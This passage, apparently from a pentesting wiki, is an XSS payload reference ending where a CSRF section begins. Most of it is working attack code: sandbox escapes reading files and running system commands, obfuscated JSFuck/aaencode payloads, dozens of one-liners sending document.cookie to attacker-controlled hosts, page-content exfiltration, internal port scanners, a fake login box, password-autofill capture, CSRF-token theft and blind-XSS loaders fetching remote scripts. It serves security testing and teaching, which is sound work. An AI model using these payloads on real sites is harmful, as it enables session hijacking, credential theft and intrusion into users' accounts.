In other browsers other 
Content-Types
 can be used to execute arbitrary JS, check: https://github.com/BlackFan/content-type-research/blob/master/XSS.md
xml Content Type

If the page is returnin a text/xml content-type it's possible to indicate a namespace and execute arbitrary JS:

<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->

Special Replacement Patterns

When something like 
"some {{template}} data".replace("{{template}}", <user_input>)
 is used. The attacker could use special string replacements to try to bypass some protections: "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"}))

For example in this writeup, this was used to scape a JSON string inside a script and execute arbitrary code.
Chrome Cache to XSS
Chrome Cache to XSS
XS Jails Escape

If you are only have a limited set of chars to use, check these other valid solutions for XSJail problems:

// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
  // Just replace console.log(1) to the real code, the code we want to run is:
  //return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

  //Final solution
with(
  /with(String)
    with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
      with(mainModule)
        with(require(k))
          return(String(readFileSync(n)))
  /)
with(this)
  with(constructor)
    constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE

If everything is undefined before executing untrusted code (like in this writeup) it's possible to generate useful objects "out of nothing" to abuse the execution of arbitrary untrusted code:

    Using import()

// although import "fs" doesn’t work, import('fs') does.
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))

    Accessing require indirectly

According to this modules are wrapped by Node.js within a function, like this:

(function (exports, require, module, __filename, __dirname) {
    // our actual module code
});

Therefore, if from that module we can call another function, it's possible to use arguments.callee.caller.arguments[1] from that function to access 
require
:

(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")})()

In a similar way to the previous example, it's possible to use error handlers to access the wrapper of the module and get the 
require
 function:

try {
	null.f()
} catch (e) {
	TypeError = e.constructor
}
Object = {}.constructor
String = ''.constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
	const oldStackTrace = Error.prepareStackTrace
	try {
		Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
		Error.captureStackTrace(this)
		this.stack
	} finally {
		Error.prepareStackTrace = oldStackTrace
	}
}
function trigger() {
	const err = new CustomError()
	console.log(err.stack[0])
	for (const x of err.stack) {
		// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
		const fn = x.getFunction()
		console.log(String(fn).slice(0, 200))
		console.log(fn?.arguments)
		console.log('='.repeat(40))
		if ((args = fn?.arguments)?.length > 0) {
			req = args[1]
			console.log(req('child_process').execSync('id').toString())
		}
	}
}
trigger()

Obfuscation & Advanced Bypass

    Different obfuscations in one page: https://aem1k.com/aurebesh.js/

    https://github.com/aemkei/katakana.js

    https://ooze.ninja/javascript/poisonjs

    https://javascriptobfuscator.herokuapp.com/

    https://skalman.github.io/UglifyJS-online/

    http://www.jsfuck.com/

    More sofisticated JSFuck: https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce

    http://utf-8.jp/public/jjencode.html

    https://utf-8.jp/public/aaencode.html

    https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses

//Katana
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>

//JJencode 
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>

//JSFuck
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>

//aaencode
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');

// It's also possible to execute JS code only with the chars: []`+!${}

XSS common payloads
Several payloads in 1
Steal Info JS
Iframe Trap

Make the use navigate in the page without exiting an iframe and steal of his actions (including information sent in forms):
Iframe Traps
Retrieve Cookies

<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>

You won't be able to access the cookies from JavaScript if the HTTPOnly flag is set in the cookie. But here you have some ways to bypass this protection if you are lucky enough.
Steal Page Content

var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);

Find internal IPs

<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(){
        fetchUrl(url, wait);
    }
  }('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
  if(q.length) q.shift()();
}

function fetchUrl(url, wait){
    console.log(url)
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
        location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
    }
  ))
  .catch(e => {
  if(!String(e).includes("The user aborted a request") && q.length) {
    q.shift()();
  }
  });

  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()();
  }
  }, wait);
}
</script>

Port Scanner (fetch)

const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }

Port Scanner (websockets)

var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
    var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
    s.start = performance.now();
    s.port = ports[i];
    s.onerror = function() {
        console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
    };
    s.onopen = function() {
        console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
    };
}

Short times indicate a responding port Longer times indicate no response.

Review the list of ports banned in Chrome here and in Firefox here.
Box to ask for credentials

<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>

Auto-fill passwords capture

<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

When any data is introduced in the password field, the username and password is sent to the attackers server, even if the client selects a saved password and don't write anything the credentials will be ex-filtrated.
Keylogger

Just searching in github I found a few different ones:

    https://github.com/JohnHoder/Javascript-Keylogger

    https://github.com/rajeshmajumdar/keylogger

    https://github.com/hakanonymos/JavascriptKeylogger

    You can also use metasploit http_javascript_keylogger

Stealing CSRF tokens

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

Stealing PostMessage messages

<img src="https://attacker.com/?" id=message>
<script>
 window.onmessage = function(e){
 document.getElementById("message").src += "&"+e.data;
</script>

Abusing Service Workers
Abusing Service Workers
Accessing Shadow DOM
Shadow DOM
Polyglots
LogoAuto_Wordlists/xss_polyglots.txt at main · carlospolop/Auto_WordlistsGitHub
Blind XSS payloads

You can also use: https://xsshunter.com/

"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')"> 

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

Regex - Access Hidden Content

From this writeup it's possible to learn that even if some values disappear from JS, it's still possible to find them in JS attributes in different objects. For example, an input of a REGEX is still possible to find it after the value of the input of the regex was removed:

// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])

Brute-Force List
LogoAuto_Wordlists/xss.txt at main · carlospolop/Auto_WordlistsGitHub
XSS Abusing other vulnerabilities
XSS in Markdown

Can inject Markdown code that will be renderer? Maybe you you can get XSS! Check:
XSS in Markdown
XSS to SSRF

Got XSS on a site that uses caching? Try upgrading that to SSRF through Edge Side Include Injection with this payload:

<esi:include src="http://yoursite.com/capture" />

Use it to bypass cookie restrictions, XSS filters and much more!
More information about this technique here: XSLT.
XSS in dynamic created PDF

If a web page is creating a PDF using user controlled input, you can try to trick the bot that is creating the PDF into executing arbitrary JS code.
So, if the PDF creator bot finds some kind of HTML tags, it is going to interpret them, and you can abuse this behaviour to cause a Server XSS.
Server Side XSS (Dynamic PDF)

If you cannot inject HTML tags it could be worth it to try to inject PDF data:
PDF Injection
XSS in Amp4Email

AMP, aimed at accelerating web page performance on mobile devices, incorporates HTML tags supplemented by JavaScript to ensure functionality with an emphasis on speed and security. It supports a range of components for various features, accessible via AMP components.

The AMP for Email format extends specific AMP components to emails, enabling recipients to interact with content directly within their emails.

Example writeup XSS in Amp4Email in Gmail.
XSS uploading files (svg)

Upload as an image a file like the following one (from http://ghostlulz.com/xss-svg/):

Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert(1);
   </script>
</svg>
-----------------------------232181429808--

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <script type="text/javascript">alert("XSS")</script>
</svg>

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>

<svg width="500" height="500"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>

  <foreignObject width="500" height="500">
     <iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
     <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
  </foreignObject>
</svg>

<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>

<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />

Find more SVG payloads in https://github.com/allanlw/svg-cheatsheet
Misc JS Tricks & Relevant Info
Misc JS Tricks & Relevant Info
XSS resources

    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection

    http://www.xss-payloads.com https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt https://github.com/materaj/xss-list

    https://github.com/ismailtasdelen/xss-payload-list

    https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec

    https://netsec.expert/2020/02/01/xss-in-2020.html
## CSRF
Defences Bypass
From POST to GET

Maybe the form you want to abuse is prepared to send a POST request with a CSRF token but, you should check if a GET is also valid and if when you send a GET request the CSRF token is still being validated.
Lack of token

